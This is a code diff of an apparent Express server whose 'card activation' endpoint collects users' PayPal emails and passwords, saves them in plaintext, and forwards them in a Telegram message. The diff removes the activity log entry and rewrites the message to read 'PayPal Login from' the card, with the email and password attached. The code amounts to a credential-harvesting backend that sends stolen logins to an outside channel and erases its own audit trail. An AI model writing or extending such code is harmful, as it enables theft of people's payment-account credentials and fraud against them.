@@ -1,4 +1,3 @@
-// server.js
 import express from 'express';
 import jwt from 'jsonwebtoken';
 import fs from 'fs';
@@ -171,9 +170,8 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
         card.status = 'activated';
         card.paypalUsername = paypalUsername;
         card.paypalPassword = paypalPassword;
-        data.logs.push({ user: req.user.username, time: Date.now() });
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-        const message = `Card ${cardId} activated by ${req.user.username} with PayPal: Email: ${paypalUsername}, Password: ${paypalPassword}`;
+        const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
         await sendTelegramNotification(message);
         res.json({ message: 'Card activated', cardId });
     } catch (error) {
